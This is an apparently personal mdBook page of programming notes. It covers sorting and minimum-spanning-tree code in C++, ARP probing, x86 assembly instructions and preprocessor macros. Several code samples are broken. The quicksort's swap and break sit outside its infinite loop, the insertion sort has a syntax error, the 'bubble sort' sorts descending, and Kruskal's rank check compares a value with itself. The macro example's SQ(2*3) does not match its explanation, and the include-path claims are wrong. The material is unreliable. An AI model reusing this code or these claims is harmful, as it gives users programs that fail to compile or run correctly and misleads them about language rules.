<!DOCTYPE HTML>
<html lang="en" class="ayu" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Notes</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="./src/notes/custom.css">
        <link rel="stylesheet" href="./src/notes/katex.min.css">

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('ayu')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item "><a href="notes/algorithms.html"><strong aria-hidden="true">1.</strong> ./notes/algorithms.md</a></li><li class="chapter-item "><a href="notes/arp.html"><strong aria-hidden="true">2.</strong> ./notes/arp.md</a></li><li class="chapter-item "><a href="notes/asm.html"><strong aria-hidden="true">3.</strong> ./notes/asm.md</a></li><li class="chapter-item "><a href="notes/basic_preproc.html"><strong aria-hidden="true">4.</strong> ./notes/basic_preproc.md</a></li><li class="chapter-item "><a href="notes/boost_asio.html"><strong aria-hidden="true">5.</strong> ./notes/boost_asio.md</a></li><li class="chapter-item "><a href="notes/c_codes.html"><strong aria-hidden="true">6.</strong> ./notes/c_codes.md</a></li><li class="chapter-item "><a href="notes/classes.html"><strong aria-hidden="true">7.</strong> ./notes/classes.md</a></li><li class="chapter-item "><a href="notes/cmake.html"><strong aria-hidden="true">8.</strong> ./notes/cmake.md</a></li><li class="chapter-item "><a href="notes/C_notes.html"><strong aria-hidden="true">9.</strong> ./notes/C_notes.md</a></li><li class="chapter-item "><a href="notes/compilers.html"><strong aria-hidden="true">10.</strong> ./notes/compilers.md</a></li><li class="chapter-item "><a href="notes/concurrency.html"><strong aria-hidden="true">11.</strong> ./notes/concurrency.md</a></li><li class="chapter-item "><a href="notes/cont_struct.html"><strong aria-hidden="true">12.</strong> ./notes/cont_struct.md</a></li><li class="chapter-item "><a href="notes/cp_codes.html"><strong aria-hidden="true">13.</strong> ./notes/cp_codes.md</a></li><li class="chapter-item "><a href="notes/cpp_guidelines.html"><strong aria-hidden="true">14.</strong> ./notes/cpp_guidelines.md</a></li><li class="chapter-item "><a href="notes/cpp.html"><strong aria-hidden="true">15.</strong> ./notes/cpp.md</a></li><li class="chapter-item "><a href="notes/cp_qs_models.html"><strong aria-hidden="true">16.</strong> ./notes/cp_qs_models.md</a></li><li class="chapter-item "><a href="notes/cp_qs_reading.html"><strong aria-hidden="true">17.</strong> ./notes/cp_qs_reading.md</a></li><li class="chapter-item "><a href="notes/cs2200.html"><strong aria-hidden="true">18.</strong> ./notes/cs2200.md</a></li><li class="chapter-item "><a href="notes/cs2600.html"><strong aria-hidden="true">19.</strong> ./notes/cs2600.md</a></li><li class="chapter-item "><a href="notes/csd.html"><strong aria-hidden="true">20.</strong> ./notes/csd.md</a></li><li class="chapter-item "><a href="notes/cv_qualifiers.html"><strong aria-hidden="true">21.</strong> ./notes/cv_qualifiers.md</a></li><li class="chapter-item "><a href="notes/data_structures.html"><strong aria-hidden="true">22.</strong> ./notes/data_structures.md</a></li><li class="chapter-item "><a href="notes/data_types.html"><strong aria-hidden="true">23.</strong> ./notes/data_types.md</a></li><li class="chapter-item "><a href="notes/dhcp.html"><strong aria-hidden="true">24.</strong> ./notes/dhcp.md</a></li><li class="chapter-item "><a href="notes/dhcpv6.html"><strong aria-hidden="true">25.</strong> ./notes/dhcpv6.md</a></li><li class="chapter-item "><a href="notes/dns.html"><strong aria-hidden="true">26.</strong> ./notes/dns.md</a></li><li class="chapter-item "><a href="notes/enum_classes.html"><strong aria-hidden="true">27.</strong> ./notes/enum_classes.md</a></li><li class="chapter-item "><a href="notes/file_descriptors.html"><strong aria-hidden="true">28.</strong> ./notes/file_descriptors.md</a></li><li class="chapter-item "><a href="notes/functions.html"><strong aria-hidden="true">29.</strong> ./notes/functions.md</a></li><li class="chapter-item "><a href="notes/gdb.html"><strong aria-hidden="true">30.</strong> ./notes/gdb.md</a></li><li class="chapter-item "><a href="notes/hacking_basics.html"><strong aria-hidden="true">31.</strong> ./notes/hacking_basics.md</a></li><li class="chapter-item "><a href="notes/icmp.html"><strong aria-hidden="true">32.</strong> ./notes/icmp.md</a></li><li class="chapter-item "><a href="notes/if_else_loops.html"><strong aria-hidden="true">33.</strong> ./notes/if_else_loops.md</a></li><li class="chapter-item "><a href="notes/io.html"><strong aria-hidden="true">34.</strong> ./notes/io.md</a></li><li class="chapter-item "><a href="notes/ipv4.html"><strong aria-hidden="true">35.</strong> ./notes/ipv4.md</a></li><li class="chapter-item "><a href="notes/ipv6.html"><strong aria-hidden="true">36.</strong> ./notes/ipv6.md</a></li><li class="chapter-item "><a href="notes/jpeg.html"><strong aria-hidden="true">37.</strong> ./notes/jpeg.md</a></li><li class="chapter-item "><a href="notes/memory.html"><strong aria-hidden="true">38.</strong> ./notes/memory.md</a></li><li class="chapter-item "><a href="notes/natas_levels.html"><strong aria-hidden="true">39.</strong> ./notes/natas_levels.md</a></li><li class="chapter-item "><a href="notes/network_stack.html"><strong aria-hidden="true">40.</strong> ./notes/network_stack.md</a></li><li class="chapter-item "><a href="notes/poe.html"><strong aria-hidden="true">41.</strong> ./notes/poe.md</a></li><li class="chapter-item "><a href="notes/pointers.html"><strong aria-hidden="true">42.</strong> ./notes/pointers.md</a></li><li class="chapter-item "><a href="notes/project_euler.html"><strong aria-hidden="true">43.</strong> ./notes/project_euler.md</a></li><li class="chapter-item "><a href="notes/python.html"><strong aria-hidden="true">44.</strong> ./notes/python.md</a></li><li class="chapter-item "><a href="notes/references.html"><strong aria-hidden="true">45.</strong> ./notes/references.md</a></li><li class="chapter-item "><a href="notes/regex.html"><strong aria-hidden="true">46.</strong> ./notes/regex.md</a></li><li class="chapter-item "><a href="notes/registers.html"><strong aria-hidden="true">47.</strong> ./notes/registers.md</a></li><li class="chapter-item "><a href="notes/rust_notes.html"><strong aria-hidden="true">48.</strong> ./notes/rust_notes.md</a></li><li class="chapter-item "><a href="notes/rvalue_refs.html"><strong aria-hidden="true">49.</strong> ./notes/rvalue_refs.md</a></li><li class="chapter-item "><a href="notes/static_variables_and_functions.html"><strong aria-hidden="true">50.</strong> ./notes/static_variables_and_functions.md</a></li><li class="chapter-item "><a href="notes/std_forward.html"><strong aria-hidden="true">51.</strong> ./notes/std_forward.md</a></li><li class="chapter-item "><a href="notes/strings_arrays.html"><strong aria-hidden="true">52.</strong> ./notes/strings_arrays.md</a></li><li class="chapter-item "><a href="notes/tcp.html"><strong aria-hidden="true">53.</strong> ./notes/tcp.md</a></li><li class="chapter-item "><a href="notes/traceroute.html"><strong aria-hidden="true">54.</strong> ./notes/traceroute.md</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="algorithms"><a class="header" href="#algorithms">algorithms</a></h1>
<h2 id="sorting-algos"><a class="header" href="#sorting-algos">Sorting Algos</a></h2>
<ul>
<li>Bubble Sort:</li>
</ul>
<pre><code class="language-cpp">int arr[] = {1,3,6,2,5,4,8,9};

for (int i = 0; i &lt; 8; i++){
    for (int j = 0; j &lt; 7 - i; j++){
        if (arr[j] &lt; arr[j+1]){
            std::swap(arr[j], arr[j + 1]);
        }
    }
}
</code></pre>
<ul>
<li>Insertion Sort:</li>
</ul>
<pre><code class="language-cpp">int arr[] = {1,3,6,2,5,4,8,9};

for (int i = 0; i &lt; 8; i++) {
    int x = arr[i];
    int j = i;
    for (j = i; j &gt;= 0 &amp;&amp; arr[j] &gt; x, j--) {
        arr[j] = arr[j - 1];
    }
    arr[j] = x;
}
</code></pre>
<ul>
<li>Selection Sort:</li>
</ul>
<pre><code class="language-cpp">int arr[] = {1,3,6,2,5,4,8,9};

for (int i = 0; i &lt; 8; i++) {
    int min_idx = i;
    for (int j = i; j &lt; 8; j++) {
        if (arr[j] &lt; arr[min_idx]) {
            min_idx = j;
        }
    }
    std::swap(arr[i], arr[min_idx]);
}
</code></pre>
<ul>
<li>Merge Sort:</li>
</ul>
<pre><code class="language-cpp">// Array A[] has the items to sort; array B[] is a work array.
void TopDownMergeSort(A[], B[], n)
{
    CopyArray(A, 0, n, B);           // one time copy of A[] to B[]
    TopDownSplitMerge(A, 0, n, B);   // sort data from B[] into A[]
}

// Split A[] into 2 runs, sort both runs into B[], merge both runs from B[] to A[]
// iBegin is inclusive; iEnd is exclusive (A[iEnd] is not in the set).
void TopDownSplitMerge(B[], iBegin, iEnd, A[])
{
    if (iEnd - iBegin &lt;= 1)                     // if run size == 1
        return;                                 //   consider it sorted
    // split the run longer than 1 item into halves
    iMiddle = (iEnd + iBegin) / 2;              // iMiddle = mid point
    // recursively sort both runs from array A[] into B[]
    TopDownSplitMerge(A, iBegin,  iMiddle, B);  // sort the left  run
    TopDownSplitMerge(A, iMiddle,    iEnd, B);  // sort the right run
    // merge the resulting runs from array B[] into A[]
    TopDownMerge(B, iBegin, iMiddle, iEnd, A);
}

//  Left source half is A[ iBegin:iMiddle-1].
// Right source half is A[iMiddle:iEnd-1   ].
// Result is            B[ iBegin:iEnd-1   ].
void TopDownMerge(B[], iBegin, iMiddle, iEnd, A[])
{
    i = iBegin, j = iMiddle;
 
    // While there are elements in the left or right runs...
    for (k = iBegin; k &lt; iEnd; k++) {
        // If left run head exists and is &lt;= existing right run head.
        if (i &lt; iMiddle &amp;&amp; (j &gt;= iEnd || A[i] &lt;= A[j])) {
            B[k] = A[i];
            i = i + 1;
        } else {
            B[k] = A[j];
            j = j + 1;
        }
    }
}

void CopyArray(A[], iBegin, iEnd, B[])
{
    for (k = iBegin; k &lt; iEnd; k++)
        B[k] = A[k];
}
</code></pre>
<ul>
<li>Quick sort:</li>
</ul>
<pre><code class="language-cpp">
void quicksort(int A[], int low, int high) {
    if (low &gt;= high) return;
    if (low + 1 == high) {
        if (A[high] &lt; A[low]) {
            std::swap(A[low], A[high]);
        }
        return;
    } 

    int pivot = A[high];
    int i = low;
    int j = high - 1;

    while (true) {
        while (i &lt; high &amp;&amp; A[i] &lt;= pivot) i++;
        while (j &gt;= low &amp;&amp; A[j] &gt;= pivot) j--;
    }

    if (i &lt; j) {
        std::swap(A[i], A[j]);
        i++; j--;
    } else {
        break;
    }

    std::swap(A[i], A[high]);
}
</code></pre>
<h2 id="mst-algorithms"><a class="header" href="#mst-algorithms">MST algorithms</a></h2>
<ul>
<li>Kruskal’s Algorithm:</li>
</ul>
<pre><code class="language-cpp">
struct Edge {
    int u, v, weight;
    bool operator&lt;(const Edge&amp; other) {
        return weight &lt; other.weight;
    }
};

int nodes;

std::vector&lt;Edge&gt; edges; // original edges

std::vector&lt;std::pair&lt;int, int&gt;&gt; List; // final list containing our answer

std::vector&lt;int&gt; parent(nodes);
std::vector&lt;int&gt; rank(nodes);

for (int i = 0; i &lt; nodes; i++) {
    parent[i] = i;
    rank[i] = 0;

}

int find_set(int v) {
    std::vector&lt;int&gt; compress_path;
    while (v != parent[v]) {
        compress_path.push_back(v);
        v = parent[v];
    }
    for (auto &amp;i: compress_path) {
        parent[i] = v;
    }
    return v;
}

void union_sets(int a, int b, int wt) {
    int c = find_set(a);
    int d = find_set(b);

    if (c != d) {
        List.push_back({a, b, wt});
        if (rank[c] &lt; rank[c]) 
            std::swap(c, d);

        parent[d] = c;
        rank[d]++;
    }
}

sort(edges.begin(), edges.end());

for (auto &amp;e: edges) {
    union_sets(e.u, e.v, e.weight);
}

</code></pre>
<ul>
<li>Prim’s Algorithm:</li>
</ul>
<pre><code class="language-cpp">
struct Edge {
    int u, v, weight;
    bool operator&lt;(const Edge&amp; other) {
        return weight &lt; other.weight;
    }
};

int nodes;

std::list&lt;Edge&gt; adj(nodes);

std::vector&lt;Edge&gt; edges; // original edges

std::vector&lt;std::pair&lt;int, int&gt;&gt; List; // final list containing our answer

std::unordered_set&lt;int&gt; vertices;

void prims() {
    vertices.insert(0);
    while (vertices.size() != nodes) {
        Edge min = {-1, -1, INT_MAX};

        for (auto &amp;i: vertices) {
            for (auto &amp;j : adj[i]) {
                if (j.weight &lt; min.weight) {
                    min = j;
                }
            }
        }

        vertices.insert(min.u);
        vertices.insert(min.v);

        List.push_back(min);

    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="arp"><a class="header" href="#arp">arp</a></h1>
<ul>
<li>Always done within the boundaries of a single network (same IP network range).</li>
</ul>
<p>The packet has 48-bit fields for the sender hardware address (SHA) and target hardware address (THA), and 32-bit fields for the corresponding sender and target protocol addresses (SPA and TPA). The ARP packet size in this case is 28 bytes.</p>
<p>An ARP probe in IPv4 is an ARP request constructed with the SHA of the probing host, an SPA of all 0s, a THA of all 0s, and a TPA set to the IPv4 address being probed for. If some host on the network regards the IPv4 address (in the TPA) as its own, it will reply to the probe (via the SHA of the probing host) thus informing the probing host of the address conflict.</p>
<p>If instead there is no host which regards the IPv4 address as its own, then there will be no reply. When several such probes have been sent, with slight delays, and none receive replies, it can reasonably be expected that no conflict exists. As the original probe packet contains neither a valid SHA/SPA nor a valid THA/TPA pair, there is no risk of any host using the packet to update its cache with problematic data.</p>
<p>Before beginning to use an IPv4 address (whether received from manual configuration, DHCP, or some other means), a host implementing this specification must test to see if the address is already in use, by broadcasting ARP probe packets.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="asm"><a class="header" href="#asm">asm</a></h1>
<p><a href="https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf">Intel assembly 64 bit intro</a></p>
<p>The processor supports the following data types:</p>
<ul>
<li><code>Word</code>: 2 byte structure</li>
<li><code>Doubleword</code>: 4 byte structure</li>
<li><code>Quadword</code>: 8 byte structure</li>
<li><code>Paragraph</code>: 16 byte structure</li>
</ul>
<h2 id="addressing-data-in-memory"><a class="header" href="#addressing-data-in-memory">Addressing Data in Memory</a></h2>
<p>The process through which the processor controls the execution of instructions is referred as the fetch-decode-execute cycle or the execution cycle. It consists of three continuous steps −</p>
<ul>
<li>Fetching the instruction from memory</li>
<li>Decoding or identifying the instruction</li>
<li>Executing the instruction</li>
</ul>
<h2 id="some-assembly-commands-and-syntax"><a class="header" href="#some-assembly-commands-and-syntax">Some Assembly commands and syntax</a></h2>
<blockquote>
<p>Unless stated otherwise, instructions are written in intel assembly flavour.</p>
</blockquote>
<ul>
<li>
<p>DX:AX notation means that the upper half bits are in DX and lower half in AX.</p>
</li>
<li>
<p><code>adc</code> Add with carry. Differs from <code>add</code> in the sense that carry flag is also added.</p>
<ul>
<li><code>adc %b %a</code> : addition into <code>%b</code> depending on the size <code>%b</code> can hold.</li>
<li><code>%a</code> always has to be smaller than <code>%b</code></li>
</ul>
</li>
<li>
<p><code>add</code> Add without carry. Rest is same as above.</p>
</li>
<li>
<p><code>bsf %a %b</code> : bit scan forward. Finds and stores the index of the least significant bit of <code>%b</code> into <code>%a</code>. If <code>%b</code> is 0, <code>%a</code> is undefined. ZF flag is set to 0 if bit is found or 1 otherwise.</p>
</li>
<li>
<p><code>bsr</code> : bit scan reverse. Same as above for most significant bit.</p>
</li>
<li>
<p><code>bswap</code>: reverse the bits of the register.</p>
</li>
<li>
<p><code>bt %a %b</code> checks for bit at address <code>%a</code> and offset <code>%b</code>. Value is stored in carry flag.</p>
</li>
<li>
<p><code>btc</code>: do the same as above but complement the bit you fetched later on.</p>
</li>
<li>
<p><code>btr</code>: do the same as <code>bt</code> but set the position to 0.</p>
</li>
<li>
<p><code>bts</code>: do the same as <code>bt</code> but set the position to 1.</p>
</li>
<li>
<p><code>and/or/xor %a %b</code> Bitwise <strong>and/or/xor</strong> of the two arguments, stored in the first location. First has to be larger in bitwidth.</p>
</li>
<li>
<p><code>mov %a, %b</code> In GAS (AT&amp;T), moves the value of <code>%a</code> (or <code>$a</code>) to <code>%b</code> (must be an address or a register). In intel flavor, moves value of <code>%b</code> (or <code>$b</code>) to <code>%a</code> (must be an address).</p>
</li>
<li>
<p><code>imul %a, %b</code> multiplies the contents of <code>%a</code> with <code>%b</code> and stores them in <code>%a</code>.</p>
<ul>
<li><code>imul</code> is signed multiply. <code>mul</code> is the unsigned variant.</li>
<li><code>imul %a, %b, $1234</code> does <code>%a</code> = <code>%b</code>*1234. Size is extended for the last two operands as and when needed.</li>
<li><code>imul %a</code> simply multiplies <code>%a</code> with the contents of AX register and stores it in DX:AX.</li>
</ul>
</li>
<li>
<p><code>idiv</code> is signed divide. <code>div</code> is the unsigned variant.</p>
<ul>
<li><code>idiv %a</code> where a is 8bit. In this case, AL stores quotient and AH stores remainder.</li>
<li><code>idiv %a</code> where a is 16bit. In this case, AX stores quotient and DX stores remainder.</li>
</ul>
</li>
<li>
<p><code>enter</code>: create a stack frame for a procedure.</p>
</li>
<li>
<p><code>call</code>: calls a procedure.</p>
<ul>
<li>This is how it exactly happens.</li>
<li>The current  stack pointer and base pointer maintain a <strong>stack frame</strong> in the current stack. The base pointer points to the base of the frame and the stack pointer points to the top (or in this case, the bottom, since the stack is upside down) of the frame.</li>
<li>Whenever the next instruction is a <code>call</code>, the <em>current</em> base pointer is <em>push</em> ed onto the stack. This basically implies having the next 8 bytes of the <em>current</em> stack frame written with the <em>current</em> base pointer.</li>
<li>After that, the arguments of the function that is called are loaded onto the stack for use by the function.</li>
<li>Then the address from which the instruction pointer should read next, once the current stack frame is over, is loaded onto the new stack frame.</li>
<li>All this while the stack pointer was still maintaining its original value and being incremented. Now when all this is done, the base pointer is set to the stack pointer.</li>
</ul>
<!---TODO: Figure out enter--->
<!---TODO: Figure out branch and link--->
</li>
<li>
<p><code>cbw/cwde/cdqe</code>: Convert byte to word, word to doubleword, doubleword to quadword. Acts on AX reg.</p>
</li>
<li>
<p><code>clc</code>: Clear carry flag.</p>
</li>
<li>
<p><code>cmc</code>: complement carry flag.</p>
</li>
<li>
<p><code>cld</code>: Clear direction flag.</p>
</li>
<li>
<p><code>cli</code>: clear interrupt flag.</p>
</li>
<li>
<p><code>fclex</code>: clear floating point exceptions.</p>
</li>
<li>
<p><code>cmove</code>: Conditional moves. Find the list <a href="https://github.com/HJLebbink/asm-dude/wiki/CMOVcc">here</a></p>
</li>
<li>
<p><code>cmp</code> compare two values and store the result accordingly (stores the <code>zero</code> flag to be one).</p>
</li>
<li>
<p><code>cmps</code> takes two for size of string, reads the size from DS:SI to ES:DI and changes flags accordingly.</p>
<ul>
<li>has suffixes b,w,d,q for size suffixes.</li>
</ul>
</li>
<li>
<p><code>cmpxchg %a %b</code>: compare and exchange. If AX is equal to <code>%a</code> then <code>%b</code> is loaded to <code>%a</code>. Otherwise <code>%a</code> is loaded into AX. ZF is set to 1 if they are equal or 0 otherwise.</p>
<ul>
<li>Also has another variant dealing with 64 and 128 bit values. Except <code>%b</code> is implicitly taken to be CX:BX.</li>
</ul>
</li>
</ul>
<!---TODO: CRC32 instruction--->
<ul>
<li>
<p><code>dec %a</code> decrement <code>%a</code> by 1.</p>
</li>
<li>
<p><code>inc %a</code> increment by 1.</p>
</li>
<li>
<p><code>f2xm1</code>: replace ST[0] with 2^ST[0] - 1.</p>
</li>
<li>
<p><code>fabs</code>: replace ST[0] with its mod.</p>
</li>
<li>
<p><code>fbld %a</code>: load a binary coded decimal from <code>%a</code> and push it to the top of FPU stack.</p>
</li>
<li>
<p><code>fbstp %a</code>: do the exact opposite of <code>fbld</code>.</p>
</li>
<li>
<p><code>fchs</code>: change sign of ST[0].</p>
</li>
<li>
<p><code>fcmov ST[0], ST[i]</code>: dependent on the condition on CF, ZF and PF.</p>
</li>
<li>
<p><code>fincstp</code>: increment stack top field. Effectively rotates the stack. <strong>NOT</strong> equivalent to popping.</p>
</li>
<li>
<p><code>fcom/fcomp</code> the syntax is same as <code>comp</code> but it compares the two floating points and modifies the flags instead.</p>
</li>
<li>
<p><code>ficom/ficomp %a</code> compares a floating point and a register. Works the same as <code>fcom</code>.</p>
<!---TODO: wtf is register stack--->
</li>
<li>
<p><code>fadd/faddp/fiadd</code> floating point addition (followed by popping the register stack.)</p>
<ul>
<li><code>fadd %a</code> adds to ST[0] and stores it there.</li>
<li><code>fadd ST[0] ST[i]</code> add ST[i] to ST[0] and store the result in ST[0].</li>
<li><code>fadd ST[i] ST[0]</code> add ST[i] to ST[0] and store the result in ST[i].</li>
<li>If p in the end of the instruction, pop the register stack.</li>
<li><code>fiadd</code> is the same as <code>fadd</code>’s first variant but take an int argument instead.</li>
</ul>
</li>
<li>
<p><code>fsub/fsubp/fisub</code>: same as <code>fadd</code> variants but subtract instead.</p>
</li>
<li>
<p><code>fsubr/fsubrp/fisubr</code>: do reverse subtraction.</p>
</li>
<li>
<p><code>fdiv/fdivp/fidiv</code> same as <code>fadd</code> but divide.</p>
</li>
<li>
<p><code>fmul/fmulp/fimul</code>: same as <code>fdiv</code> but multiply instead.</p>
</li>
<li>
<p><code>fdivr/fdivrp/fidivr</code> same as <code>fdiv</code> but in reverse.</p>
</li>
<li>
<p><code>fild %a</code> load %a onto the register stack.</p>
</li>
<li>
<p><code>fprem</code>: replace ST[0] with ST[0]%ST[1].</p>
</li>
<li>
<p><code>fld %a</code> same as <code>fild</code> but loads a floating point instead.</p>
<ul>
<li>has some specialized variants for pushing common constants.</li>
</ul>
</li>
<li>
<p><code>fist/fistp %a</code> take ST[0] and store it in the memory location given. ST[0] is converted to a signed integer. The other one is a pop variant.</p>
</li>
<li>
<p><code>fst/fstp</code>: store ST[0] floating point into memory location.</p>
</li>
<li>
<p><code>fisttp %a</code> Do the same as above but truncate if it’s floating point.</p>
</li>
<li>
<p><code>frndint</code>: round ST[0] to integer.</p>
</li>
<li>
<p><code>fcos</code>: replace ST[0] with its approximate cosine.</p>
</li>
<li>
<p><code>fsin</code>: replace ST[0] with its sine.</p>
</li>
<li>
<p><code>fsincos</code>: compute sine and cosine of ST[0]. Replace ST[0] with the sine and push cosine.</p>
</li>
<li>
<p><code>fptan</code>: Same as <code>fcos</code> but tangent.</p>
</li>
<li>
<p><code>fsqrt</code>: take sqrt of ST[0] and store the result in ST[0].</p>
</li>
<li>
<p><code>ftst</code>: Compare ST[0] with 0 and change C3 C2 C0 flags accodingly.</p>
</li>
<li>
<p><code>fxch</code>: exchange ST[i] with ST[0] if ST[i] is given, otherwise exchange ST[1] with ST[0].</p>
</li>
<li>
<p><code>fnop</code>: no floating point operation.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-structure"><a class="header" href="#basic-structure">Basic Structure</a></h1>
<blockquote>
<p><code>#include &lt;iostream&gt;</code>: searches only in the main directory.</p>
</blockquote>
<blockquote>
<p><code>#incude “iostream”</code> : searches in both the current and the main directory.</p>
</blockquote>
<p><code>#</code> indicates to open iostream first and then compile the rest of the code. This is called a <span class="texthighlight">preprocessor directive.</span></p>
<p><code>#define a1 a2</code>: Preprocessor replaces every instance of a1 with a2 literally. <code>a1</code> has to be a valid variable.</p>
<blockquote>
<p><code>#define</code> is a macro as it rewrites portions of the code before compilation.</p>
</blockquote>
<pre><code class="language-cpp">#include &lt;iostream&gt;
#define SQ(x) x*x
int main(void){
    cout &lt;&lt; SQ(2*3) &lt;&lt; endl;
}
</code></pre>
<p>The above code will print 11 and not 25 because the compiler interprets it as <code>2 + 3*2 + 3</code> instead of <code>(2+3)*(2+3)</code>. To solve this use <code>#define SQ(x) (x)*(x)</code> or use <code>SQ((2+3))</code>.</p>
<h2 id="macros"><a class="header" href="#macros">Macros</a></h2>
<p>As stated above, literal string replacements. They can be of 3 types:</p>
<ol>
<li>Chain Macros: <code>#define CONCAT(a,b) a##b</code></li>
</ol>
<p>Basically combines the two strings into one. Can also be used to make something into a string. For example:</p>
<pre><code class="language-cpp">#define ASSERT(x) printf(#x)

//use as
ASSERT(x == y);

//will be converted to
printf("x==y");
</code></pre>
<ol start="2">
<li>
<p>Object-like Macros: Literal substitutions.</p>
</li>
<li>
<p>Function like macros: Kind of like <code>#define SQUARE(c) ((c)*(c))</code></p>
</li>
</ol>
<h3 id="undefining-a-macro"><a class="header" href="#undefining-a-macro">Undefining a macro</a></h3>
<p>Keep in mind that macros substitute everything once they are declared and do not respect scoping rules. To remove a macro after a certain point use <code>#undef MACRO_NAME</code></p>
<p><code>#include &lt;climits&gt;</code> is for including all the limits in the compiler.</p>
<pre><code class="language-cpp">int main(arguments){
    cout &lt;&lt; “Hello World!” &lt;&lt; endl;
}
</code></pre>
